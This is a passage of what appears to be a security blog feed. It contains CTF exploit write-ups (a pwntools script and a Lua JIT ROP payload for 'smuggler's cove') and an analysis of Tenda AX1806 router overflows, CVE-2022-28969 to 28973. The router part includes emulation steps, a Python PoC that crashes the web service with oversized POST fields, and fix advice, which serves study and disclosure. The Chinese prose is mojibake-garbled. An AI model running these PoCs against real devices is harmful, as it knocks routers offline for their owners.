punctuation">,</span><span class="token string">'31337'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ticket please:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">r'ticket&#123;AweighWeatherdeck5640n22:Hh6YqvgvoHk_PVza-ImPd3f_mEkDjLd-JkzxVpPsFTlwjASB&#125;'</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x30000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(io,"b *$rebase(0x1213)")</span>    payload <span class="token operator">=</span> generation<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ca_shellcode()</span><span class="token comment"># second()</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092642291.png" alt="image-20220531092642291"></p><h1 id="smugglerâ€™s-cove"><a href="#smugglerâ€™s-cove" class="headerlink" title="smugglerâ€™s cove"></a>smugglerâ€™s cove</h1><p>è¿™é¢˜æ¯”èµ›ä¸­æ²¡åšå‡ºæ¥ï¼Œçœ‹ <a href="https://uz56764.tistory.com/55">å¤§ä½¬wp</a>å¤ç°çš„ã€‚ä¹‹å‰åœ¨å„ç§æ¯”èµ›ä¸­æ¥è§¦è¿‡è¿™ç±»å‹çš„é¢˜ç›®ï¼Œä»¥å¾€éƒ½æ˜¯Cå†™çš„JSè§£é‡Šå™¨ä¹‹ç±»çš„ä¸œè¥¿ï¼Œè€ƒå¯Ÿé¢å‘å¯¹è±¡ç›¸å…³éƒ½æ¼æ´ç‚¹ã€‚ä½†è¿™æ¬¡ä¸åŒä»¥å¾€ï¼Œæœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘å’Œé˜Ÿå‹å¡åœ¨äº†Luaè¯­è¨€ä¸Šï¼Œä¸çŸ¥é“Luaçš„æ•°ç»„è¿˜å¯ä»¥è¿™ä¹ˆç”¨ï¼Œä¹Ÿæ²¡æœ‰å»å¤§èƒ†çš„å°è¯•ï¼Œè®°å½•ä¸€ä¸‹é•¿ä¸ªè®°æ€§å§ã€‚</p><p>æŒ‰ç…§ä¸Šé¢æ–‡ç« çš„è¯´æ³•ï¼ŒLuaçš„æ•°ç»„ä¸‹æ ‡åœ¨å­˜å‚¨çš„æ—¶å€™æ˜¯ä½¿ç”¨åŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œåœ¨JITè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¢«è½¬ç§»åˆ°ä¸€ä¸ªRXæ®µä¸­è¢«æ‰§è¡Œã€‚å¯ä»¥åˆ©ç”¨ä¸‹æ ‡æ¥æ„é€ ä¸€æ®µROPé“¾ï¼Œå‰ææ˜¯å°†64ä½ç¨‹åºè½¬ä¸ºåŒç²¾åº¦æµ®ç‚¹æ•°ï¼š<a href="https://gregstoll.com/~gregstoll/floattohex/">åœ¨çº¿è½¬æ¢ç½‘ç«™</a>ã€‚æœ¬é¢˜å› ä¸ºæ˜¯ç½‘é¡µç«¯çš„ï¼Œæ‰€ä»¥åœ¨æ¯”èµ›æ—¶æ— æ³•è·å–shellè¿›è¡Œäº¤äº’ï¼Œéœ€è¦æ‰§è¡Œé¢˜ç›®ç»™å‡ºçš„ç¨‹åº <code>x marks the spot</code> è‡ªåŠ¨æ‰“å°å‡ºflagã€‚Luaè„šæœ¬ä»£ç éœ€è¦å°äº433ï¼Œæ‰€ä»¥æ„é€ çš„ROPé“¾éå¸¸æœ‰é™ï¼Œ<code>jmp</code> æŒ‡ä»¤åœ¨çŸ­è·³è½¬æ—¶åªå ç”¨ä¸¤å­—èŠ‚ï¼Œå› æ­¤å¯ä»¥ç”¨çŸ­è·³è½¬å®ç°ã€‚</p><p>è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥è‡ªè¡Œè°ƒè¯•ä¸€ä¸‹ï¼Œexpå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> s0 <span class="token operator">=</span> <span class="token string">"spot\x00the\x00marks\x00x\x00./dig_up_the_loot"</span>a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">5.818854254051108e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.2119828994673418e-188</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604507616872868e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069739006113e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069656115653e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.6045069821896574e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">3.604506949033473e-308</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">1.0359661452274597e-212</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">5.92480351975e-313</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2.2373500568022293e-169</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>a<span class="token punctuation">[</span><span class="token number">2261634.5098039214</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>b <span class="token operator">=</span> arg<span class="token keyword">end</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">cargo</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token function">f</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tenda AX1806è·¯ç”±å™¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´</title>
      <link href="/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/"/>
      <url>/2022/05/11/tenda-ax1806-lu-you-qi-duo-chu-zhan-yi-chu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Tenda-AX1806è·¯ç”±å™¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´"><a href="#Tenda-AX1806è·¯ç”±å™¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´" class="headerlink" title="Tenda AX1806è·¯ç”±å™¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´"></a>Tenda AX1806è·¯ç”±å™¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´</h1><p>Tenda AX1806è·¯ç”±å™¨å›ºä»¶ç‰ˆæœ¬ v1.0.0.1ï¼Œå­˜åœ¨å¤šå¤„æ ˆæº¢å‡ºæ¼æ´ï¼Œæ¼æ´ç‚¹åœ¨ tdhttpd äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†å±é™©å‡½æ•° <code>strcpy</code> å‰æœªå¯¹å‚æ•°é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´ã€‚</p><h1 id="CVEä¿¡æ¯"><a href="#CVEä¿¡æ¯" class="headerlink" title="CVEä¿¡æ¯"></a>CVEä¿¡æ¯</h1><p>é€šè¿‡å…¬å¸ƒçš„æ¼æ´ç¼–å·ï¼Œå¾—çŸ¥CVEç¼–å·ä¸º CVE-2022-28971ã€CVE-2022-28972ã€CVE-2022-28970ã€CVE-2022-28969ã€CVE-2022-28973ã€‚åœ¨CVEç½‘ç«™ä¸­æŸ¥è¯¢ç›¸å…³ä¿¡æ¯ï¼Œå¾—åˆ°æ¼æ´ç›¸å…³ä¿¡æ¯ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯æº¢å‡ºç±»æ¼æ´ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155545109.png" alt="image-20220511155545109"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åœ¨å®˜ç½‘ä¸‹è½½å›ºä»¶ï¼ˆä¸‹è½½é“¾æ¥åœ¨æ–‡æœ«ï¼‰ï¼Œä½¿ç”¨ binwalk è§£åŒ…å›ºä»¶ï¼ˆéœ€è¦ç”¨åˆ°ubi_readerï¼‰ï¼Œå¾—åˆ° ubifs æ–‡ä»¶ç³»ç»Ÿï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155440259.png" alt="image-20220511155440259"></p><p>æŸ¥è¯¢æ”¶é›†CVEä¿¡æ¯ï¼Œå¾—çŸ¥æ¼æ´ç‚¹åœ¨äº <code>fromAdvSetMacMtuWan</code> ã€<code>form_fast_setting_wifi_set</code> ã€<code>fromSetIpMacBind</code>ã€<code>GetParentControlInfo</code>ã€<code>fromSetWifiGusetBasic</code> å‡½æ•°ä¸­ã€‚</p><p>å¯¹äºè¿™ç§è·¯ç”±å™¨ç³»ç»Ÿæ¥è¯´ï¼Œè·¯ç”±å™¨ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ httpd æœåŠ¡æ¥è¿è¡Œè·¯ç”±å™¨ç®¡ç†é¡µé¢ï¼Œç”¨æˆ·åœ¨ä¿®æ”¹è·¯ç”±å™¨é…ç½®æ—¶ç›´æ¥åœ¨ç®¡ç†é¡µé¢ä¸Šæäº¤æ•°æ®ï¼Œäº¤ç»™ httpd æœåŠ¡ç¨‹åºå¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å›ºä»¶ç³»ç»Ÿä¸­æŸ¥æ‰¾ httpd ç›¸å…³æ–‡ä»¶ç„¶ååˆ†æã€‚ä½¿ç”¨ <code>grep -r httpd .</code> å‘½ä»¤åœ¨ .&#x2F;bin æ–‡ä»¶å¤¹ä¸‹æŸ¥æ‰¾åˆ°ä¸€ä¸ª tdhttpd å¯æ‰§è¡Œç¨‹åºï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155514329-20220511155637583.png" alt="image-20220511155514329"></p><p>å°† tdhttpd æ”¾å…¥IDAæŸ¥çœ‹ï¼ŒARM 32ä½å°ç«¯ï¼Œæ–‡ä»¶æ²¡æœ‰å»æ‰ç¬¦å·ï¼Œå¾ˆå®¹æ˜“åˆ†æã€‚æ¥ä¸‹æ¥åˆ†æä¸Šé¢æåˆ°çš„å‡ ä¸ªæ¼æ´å‡½æ•°ã€‚<code>fromAdvSetMacMtuWan</code> å†…è°ƒç”¨å‡½æ•° <code>sub_658D8</code>ï¼Œ<code>sub_658D8</code> å†…å­—ç¬¦ä¸²æ‹·è´å‰æœªå¯¹è¾“å…¥å‚æ•°åšé•¿åº¦åˆ¤æ–­ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155659701.png" alt="image-20220511155659701"><code>form_fast_setting_wifi_set</code> å‡½æ•°åœ¨å¤„ç† <code>timeZone</code> å‚æ•°æ—¶æœªå¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155721295.png" alt="image-20220511155721295"><code>fromSetIpMacBind</code> å°±æ›´ç¦»è°±äº†ï¼Œæœªå¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œæ— è®ºå¦‚ä½•éƒ½å°†å†…å®¹æ‹·è´åˆ°v20å˜é‡ä¸­ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155746366.png" alt="image-20220511155746366"></p><p><code>GetParentControlInfo</code> å‡½æ•°åœ¨æ‹·è´åˆ°å †å—æ—¶æœªå¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´å †æº¢å‡ºï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155804517.png" alt="image-20220511155804517"></p><p><code>fromSetWifiGusetBasic</code> å‡½æ•°ä¹Ÿæ˜¯æ²¡æœ‰åˆ¤æ–­å‚æ•°é•¿åº¦ç›´æ¥è¿›è¡Œæ‹·è´ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155815123.png" alt="image-20220511155815123"></p><h1 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h1><p>ä½¿ç”¨ <code>sudo qemu-arm-static -L . ./bin/tdhttpd</code> æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶ï¼Œè¿è¡Œæ—¶ç›‘å¬äº†80ç«¯å£ï¼Œä½†æ— æ³•è®¿é—®é¡µé¢ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155846796.png" alt="image-20220511155846796"></p><p>è¿™ä¸ªæ˜¯å› ä¸ºIPåœ°å€ä¸å¯¹ï¼Œå¯ä»¥å¦èµ·ä¸€ä¸ªç»ˆç«¯æŸ¥çœ‹80ç«¯å£çš„IPåœ°å€ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155913743.png" alt="image-20220511155913743"></p><p>è¿™æ—¶å€™éœ€è¦æ–°å»ºä¸€ä¸ªç½‘æ¡¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uml-utilities bridge-utils<span class="token function">sudo</span> brctl addbr br0<span class="token function">sudo</span> brctl addif br0 ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 up<span class="token function">sudo</span> dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–°å»ºç½‘æ¡¥åé™¤äº†æœ¬åœ°ç½‘å¡ ens33 ä»¥å¤–å¤šäº†ä¸€ä¸ª br0 ç½‘å¡ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155926719.png" alt="image-20220511155926719"></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155935208.png" alt="image-20220511155935208"></p><p>ç„¶åå®‰è£… arm ç¯å¢ƒçš„ libcï¼ŒæŠŠ qemu-arm-static æ‹·è´åˆ°å›ºä»¶æ ¹æ–‡ä»¶å¤¹ä¸‹ï¼Œå†æ¬¡è¿è¡Œ httpd æœåŠ¡ï¼Œå°±å¯ä»¥æ¨¡æ‹ŸæˆåŠŸå¹¶è®¿é—®é¡µé¢äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user-static libc6-arm* libc6-dev-arm*<span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-arm-static<span class="token variable">)</span></span> <span class="token builtin class-name">.</span><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511155950195.png" alt="image-20220511155950195"></p><p>è™½ç„¶èƒ½æ¨¡æ‹Ÿéƒ¨åˆ†é¡µé¢ï¼Œä½†æ˜¯ Wi-Fi åŠŸèƒ½æ˜¯ä¸èƒ½ç”¨çš„ï¼Œå› ä¸º Wi-Fi åŠŸèƒ½éœ€è¦ç‹¬ç«‹çš„ç¡¬ä»¶æ¥æ”¯æŒï¼Œæ‰€ä»¥å¦‚æœè¦æµ‹è¯• Wi-Fi åŠŸèƒ½ç›¸å…³çš„æ¥å£ï¼Œè¿˜æ˜¯éœ€è¦è´­ä¹°è·¯ç”±å™¨æ‰è¡Œã€‚ç”±äºæˆ‘æ˜¯çº¯æ¨¡æ‹Ÿï¼Œæ²¡æœ‰è´­ä¹°è·¯ç”±å™¨ï¼Œæ‰€ä»¥æµ‹è¯•æ¥å£çš„æ—¶å€™å‚è€ƒäº†å…¬å¸ƒçš„PoCä»£ç ï¼Œè¿™é‡Œæ¨¡æ‹Ÿå›ºä»¶åªæ˜¯æ–¹ä¾¿å¤ç°è°ƒè¯•ã€‚Pocä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">CVE_2022_28970</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"mac"</span><span class="token punctuation">:</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/GetParentControlInfo>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28973</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"wanMTU"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/AdvSetMacMtuWan>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28969</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"shareSpeed"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/WifiGuestSet>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28971</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"list"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x800</span><span class="token punctuation">,</span>        <span class="token string">b"bindnum"</span><span class="token punctuation">:</span> <span class="token string">b"1"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/SetIpMacBind>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CVE_2022_28972</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">b"ssid"</span><span class="token punctuation">:</span> <span class="token string">b'A'</span><span class="token punctuation">,</span>        <span class="token string">b"timeZone"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b":"</span> <span class="token operator">+</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x400</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"&lt;http://172.16.96.20/goform/fast_setting_wifi_set>"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>CVE_2022_28971<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ä½¿ç”¨ gdb-multiarch æ¥åŠ¨æ€è°ƒè¯•Pocï¼Œåªéœ€è¦åœ¨qemuè¿è¡Œæ—¶åŠ ä¸Šè°ƒè¯•å‚æ•°ã€‚qemuè¿è¡Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> ./ ./qemu-arm-static ./bin/tdhttpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è°ƒè¯•è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"target remote :1234"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"python set_arch(<span class="token entity" title="\\">\\</span>"</span>arm<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token string">")"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"b *(<span class="token variable">$1</span>)"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡ŒPocï¼Œå› ä¸ºæ ˆä¸­è¿”å›åœ°å€è¢«è¦†ç›–ï¼Œæœ€åä¼šè¿”å›æ®µé”™è¯¯ä¿¡æ¯ï¼Œqemu å´©æºƒé€€å‡ºã€‚ä½†å¦‚æœåœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œè·¯ç”±å™¨å°±å·²ç»å®•æœºäº†ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511160007824.png" alt="image-20220511160007824"></p><p>å› ä¸ºæ˜¯ <code>strcpy</code> å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ‹·è´ï¼Œé‡åˆ°ç©ºå­—ç¬¦ä¼šæˆªæ–­ï¼Œæ‰€ä»¥æ— æ³•æ„é€ åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œåªèƒ½è¾¾åˆ°æ‹’ç»æœåŠ¡çš„æ”»å‡»ç›®çš„ã€‚</p><h1 id="æ¼æ´ä¿®å¤æ€è·¯"><a href="#æ¼æ´ä¿®å¤æ€è·¯" class="headerlink" title="æ¼æ´ä¿®å¤æ€è·¯"></a>æ¼æ´ä¿®å¤æ€è·¯</h1><p>æ€»ç»“ä¸‹æ¥å°±æ˜¯ä½¿ç”¨å±é™©å‡½æ•° <code>strcpy</code> å‰æœªå¯¹å‚æ•°è¿›è¡Œé•¿åº¦åˆ¤æ–­ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚å¯å°† <code>strcpy</code> å‡½æ•°æ›¿æ¢ä¸º <code>strncpy</code> å‡½æ•°æ§åˆ¶æ‹·è´å­—ç¬¦é•¿åº¦ï¼Œæˆ–è€…åœ¨ä½¿ç”¨ <code>strcpy</code> å‰å¯¹é•¿åº¦è¿›è¡Œåˆ¤æ–­ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tenda.com.cn/download/detail-3306.html">AX1806 å‡çº§è½¯ä»¶_è…¾è¾¾(Tenda)å®˜æ–¹ç½‘ç«™</a></p><p><a href="https://github.com/d1tto/IoT-vuln/tree/main/Tenda/AX1806">IoT-vuln&#x2F;Tenda&#x2F;AX1806 at main Â· d1tto&#x2F;IoT-vuln</a></p><p><a href="https://www.anquanke.com/post/id/204326">å†™ç»™åˆå­¦è€…çš„IoTå®æˆ˜æ•™ç¨‹ä¹‹ARMæ ˆæº¢å‡º</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angrå…¥é—¨(äºŒ)</title>
      <link href="/2022/05/01/angr-ru-men-er/"/>
      <url>/2022/05/01/angr-ru-men-er/</url>
      
        <content type="html"><![CDATA[<p>æœ‰äº†ä¸Šä¸€ç¯‡ <a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angrå…¥é—¨</a> çš„é“ºå«åï¼Œç°åœ¨å­¦ä¹ ä¸€ä¸‹ angr å¦‚ä½•ç»™æŒ‡å®šå†…å­˜åœ°å€èµ‹å€¼ã€‚</p><h1 id="Part-4-angr-symbolic-memory"><a href="#Part-4-angr-symbolic-memory" class="headerlink" title="Part 4 angr symbolic memory"></a>Part 4 angr symbolic memory</h1><p>è¿™æ¬¡ä»¥ä¸€ä¸ªä¾‹é¢˜æ¥å­¦ä¹ å¦‚ä½•åœ¨ angr ä¸­è®¾ç½®æŒ‡å®šåœ°å€çš„å€¼ã€‚ç”¨ IDA æ‰“å¼€ 05_angr_symbolic_memory æ–‡ä»¶ï¼ŒæŸ¥çœ‹å‡½æ•°é€»è¾‘ã€‚ä¾ç„¶æ˜¯ä½¿ç”¨ <code>scanf</code> å‡½æ•°è¯»å–è¾“å…¥ï¼Œè¾“å…¥çš„å†…å®¹æ”¾å…¥äº†å…¨å±€å˜é‡çš„å››ä¸ªåœ°å€ä¸­ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªåœ°å€å¹¶éå¸¸è§„çš„ bss æ®µåœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å†…å­˜åœ°å€ï¼Œéšåä½¿ç”¨ <code>complex_function</code> å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†ï¼Œæœ€åéœ€è¦å’Œç»™å‡ºçš„å­—ç¬¦ä¸²ç›¸åŒï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501103834228.png" alt="image-20220501103834228"></p><p>æ ¹æ®ä¹‹å‰å­¦ä¹ è¿‡çš„ angr ä½¿ç”¨æ–¹æ³•ï¼Œå¯ä»¥åœ¨ <code>scanf</code> 